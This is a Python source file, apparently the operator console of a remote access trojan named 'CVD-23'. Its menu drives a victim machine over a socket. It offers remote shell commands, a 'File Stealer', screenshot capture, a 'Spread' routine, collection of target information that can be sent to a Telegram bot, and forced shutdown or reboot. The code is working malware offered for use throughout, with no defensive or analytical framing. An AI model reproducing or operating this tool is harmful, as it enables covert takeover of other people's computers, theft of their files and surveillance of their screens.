import socket,time,os
from datetime import datetime
from platform import *
from subprocess import Popen
from requests import post
from colorama import Fore
from configuration import token,id,host,port
f_size=2048;end_f="<end_of_file>";ext_msg='[!]  Error please restart the tool'
sysname=system();usrname=uname()[1]
rc=Fore.LIGHTRED_EX;Rc=Fore.RED;gc=Fore.GREEN;Gc=Fore.LIGHTGREEN_EX;rsc=Fore.RESET;cya=Fore.CYAN;wh=Fore.WHITE;bc=Fore.BLUE
systems=['Linux','Windows']
if sysname in systems:pass
else:print(Rc+f"[!] Very Sorry This Tool is not supported by your system [{sysname}] ..")#The Tool is Beta For Now



def banner():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        if sysname=='Windows':
            try:
                Popen('neofetch -c red -ac green');time.sleep(2)
            except:
                print(f"""
 ██████╗██╗   ██╗██████╗       ██████╗ ██████╗ 
██╔════╝██║   ██║██╔══██╗      ╚════██╗╚════██╗
██║     ██║   ██║██║  ██║█████╗ █████╔╝ █████╔╝
██║     ╚██╗ ██╔╝██║  ██║╚════╝██╔═══╝  ╚═══██╗
╚██████╗ ╚████╔╝ ██████╔╝      ███████╗██████╔╝
 ╚═════╝  ╚═══╝  ╚═════╝       ╚══════╝╚═════╝ 
    └─{rc}Never Tell {Rc}anyone {wh}about your next move, {gc}surprise {wh}them with the result 
          ┌
          └─{rc}${Rc} - Filza{wh}
               ┌
               └─{cya}2{wh}+{cya}1{wh}={bc}#{rc}Hacked""");time.sleep(1.5)
        else:
            try:Popen('neofetch');time.sleep(2)
            except:exit('[!] You need to download neofetch >> "sudo apt install neofetch" or run "Linux-installer.sh" ')
    except KeyboardInterrupt:exit('')
banner()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.bind((host,port))
except OSError:
    print(f'{rc}[!] wait Address already in use !!');exit()
time.sleep(1.5)
print(f'{rc}[{wh}\{rc}] welcome {usrname}')
print(f"{rc}[{wh}/{rc}] waiting For {Rc}connect ...")
s.listen(1)
c,addr=s.accept()
print(f"{rc}[{wh}+{rc}] {rc}connected , To : {Rc}{addr}");time.sleep(1.5)


def Terminal():
    #shutdown="shutdown /s /f"                
    #fast shutdown="shutdown /p /f"
    #restart = "shutdown /r /f"
    #tasklist or "tasklist -v"
    #ipconfig
    #whoami /priv
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        usrcmd=''
        while usrcmd!='e':
            usrcmd=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Terminal{Rc}]\n└──╼ {wh}$ {rc}")
            if usrcmd=='':exit()#Type a command !!
            elif len(usrcmd) == 2 and usrcmd[0].isalpha() and usrcmd[1] == ":":
                c.send(usrcmd.encode())
                continue
            elif usrcmd.startswith("cd"):
                c.send(usrcmd.encode())
                continue
            c.sendall((usrcmd).encode())
            data=c.recv(1000000)
            print(data.decode())
        s.close()
    except:print(f'{Rc}[{rc}!{Rc}] Error in exce command ')

def Filestealer():
    os.system('cls' if os.name == 'nt' else 'clear')
    mssg=''
    while mssg!='e':
        os.system('cls' if os.name == 'nt' else 'clear')
        try:
            print(f'\n{Rc}[{wh}!{Rc}]{rc} This is the Program name on the Target computer ..')#Joker.txt this file on target computer if the file on a another path type the path too like "Desktop/Tweakpy.md", if you want to download it just type the file name "Joker.txt" You must type it right , how you get the file name? Go back and type choice number 1 "control of the Target Terminal" and type after that "ls" copy the program-file name and type it here 
            f_p=input(f"{Rc}[{wh}?{Rc}]{cya} The Program Name : ")
            if f_p=='':exit("[!] Try to Type a Name !!")
            else:
                c.send(f_p.encode())
                f=c.recv(1000000)
                print(f"\n{Rc}[{wh}!{Rc}]{rc} This path and name for the Program you just copy from target ..")#/home/TweakPY/Desktop/Joker-Filza/Downloads/Test1               in the Left You have The path ,for downloaded file and on the end of the path you have the file name you want as ex you downloaded the file but you want to rename it to something else, you type home/desktop/TweakPY/downloads/{name} , or just type the file name 
                f_n=input(f"{Rc}[{wh}?{Rc}]{cya} The Path-Name : ")
                if f_n=='':exit("[!] Try to Type a Name !!")
                else:
                    n_f=open(f_n,'wb')
                    n_f.write(f)
                    print(f"{Rc}[{rc}+{Rc}] {gc}Done !"),time.sleep(2)
                    n_f.close()
        except:exit('[!] Error in copy File ..')
    s.close()
    
def Spread():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Rc}[{wh}+{Rc}] {rc}Trying To spread the File in the Target computer"),time.sleep(0.6)
    print(f'\n{Rc}'+c.recv(1000000).decode()+'\n')
    try:input(f"\n{Rc}[{wh}*{Rc}] {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg) 

def Webbrowse():
    os.system('cls' if os.name == 'nt' else 'clear')
    web=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Web-Browse{Rc}/{bc}Your-url{Rc}]\n└──╼ {wh}$ {rc}")
    if web=="":print(Rc+'[!] Try to type a url !')
    else:
        c.send(web.encode()),time.sleep(0.5)
        print(f'\n{gc}'+c.recv(1000000).decode())
    try:input(f"\n{Rc}[{wh}*{Rc}] {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg) 

def Screen_pic():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        print(f'{Rc}[{wh}+{Rc}] {wh}Taking Screenshot Now ..')
        file_name=c.recv(1024)
        exists=c.recv(1024)
        if exists.decode()=="yes":
            exists_f="yes"
            c.send(exists_f.encode())
            with open('Tweakpy-vv1ck-'.encode()+file_name,"wb") as pic:
                print(f'{Rc}[{wh}+{Rc}] {wh}Downloading Screenshot Now ..')
                while True:
                    pic_1=c.recv(f_size)
                    if pic_1.endswith(end_f.encode()):
                        pic_1=pic_1[:-len(end_f)]
                        pic.write(pic_1)
                        break
                    pic.write(pic_1) 
            print(f'{Rc}[{wh}+{Rc}] {wh}Screenshot Downloaded {gc}successfully ..')
        else:print(f'{Rc}[{wh}+{Rc}] {wh}Screenshot Download {Rc}Faild ..')
    except:
        try:input(f"\n{Rc}[{wh}*{Rc}] {gc}Back To Menu (Press Enter...) ");main()
        except:exit(ext_msg) 
    try:input(f"\n{Rc}[{wh}*{Rc}] {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg)
    
def Target_informations():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        d=datetime.now()
        d1=d.strftime("%m-%d-%Y-%H.%M.%S")
        LIM=c.recv(1000000).decode()
        LIM2=str(LIM)
        TLS=input(f'{Rc}[{wh}?{Rc}] {cya}You want to send this data in Telegram ? {Rc}[{wh}y{Rc}-{wh}n{Rc}]: {rc}')
        print(Rc+LIM2)
        if os.path.exists(f'Target-{d1}.txt')==False:
            file=open(f'Target-{d1}.txt','a')
            file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
            file.close()
        elif os.path.exists(f'Target-{d1}.txt')==True:
            os.remove(f'Target-{d1}.txt')
            file=open(f'Target-{d1}.txt','a')
            file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
            file.close()
        else:
            try:
                file=open(f'Target__1-{d1}.txt','a')
                file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
            except:
                file=open(f'Target__2-{d1}.md','a')
                file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
        if 'y' in TLS:
            try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={LIM2}\n\nBy @TweakPY - @vv1ck')
            except:pass
        else:pass
    except:print(f'{Rc}[!] Error in Getting informations ..')
    try:input(f"\n{Rc}[{wh}*{Rc}] {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg) 

def Message_Sender():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        mssg=''
        print(f'{Rc}[{wh}!{Rc}]  Type {rc}SDR{Rc} to reboot target computer or {rc}SDT{Rc} to shutdown the target computer after you done .\n')
        while mssg!='e':
            msg=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Message-Sender{Rc}/{bc}Your-Message{Rc}]\n└──╼ {wh}$ {rc}")
            if msg=='SDT':c.send('SDT'.encode())
            elif msg=='SDR':c.send('SDR'.encode())
            c.send(msg.encode())
            MSHT=str(c.recv(1000000).decode())
            print(f'{Rc}[{rc}${Rc}]  {wh}Target Respone : ',MSHT)
        s.close()
    except:print(f'{Rc}[!] Error please Retry')
    
def Dev():
    print(f"""
{gc}[*]{bc} Develper : Filza & Joker 
{gc}[*]{Fore.MAGENTA}  Github : github.com/Filza2 && github.com/vv1ck
{gc}[*]{cya} Telegram Channel @TweakPY & @vv1ck""")
    try:input(rc+"\n[*] Back To Menu (Press Enter...) ");main()
    except:exit()
    
def main():
    time.sleep(1.1);os.system('cls' if os.name == 'nt' else 'clear')
    banner()  
    time.sleep(0.1)
    print(f"""
{Rc}[{wh}*{Rc}]{cya} Choose one of the options below \n
{Rc}[1]{wh} Terminal Controlor             {Rc}[5]{wh} ScreenShot     
{Rc}[2]{wh} File Stealer                   {Rc}[6]{wh} Target informations  
{Rc}[3]{wh} Spread                         {Rc}[7]{wh} Message Sender
{Rc}[4]{wh} WebBrowse                      {Rc}[8]{wh} Developer 
{Rc}[e]{wh} Exit . . .                     {Rc}[{gc}////////////{Rc}]                   
""")
    choice=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}]\n└──╼ {wh}$ {rc}")
    if choice=='':print(Rc+"[!] Type a number ! "),main()
    c.send(choice.encode())
    if choice=='1':Terminal()
    elif choice=='2':Filestealer()
    elif choice=='3':Spread()
    elif choice=='4':Webbrowse()
    elif choice=='5':Screen_pic()
    elif choice=='6':Target_informations()
    elif choice=='7':Message_Sender()
    elif choice=='8':Dev()
    elif choice=='e':input(rc+"[*] Exit The Tool (Press Enter...) ");os.system('cls' if os.name == 'nt' else 'clear');exit()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        return main()




try:main()
except KeyboardInterrupt:exit(2030)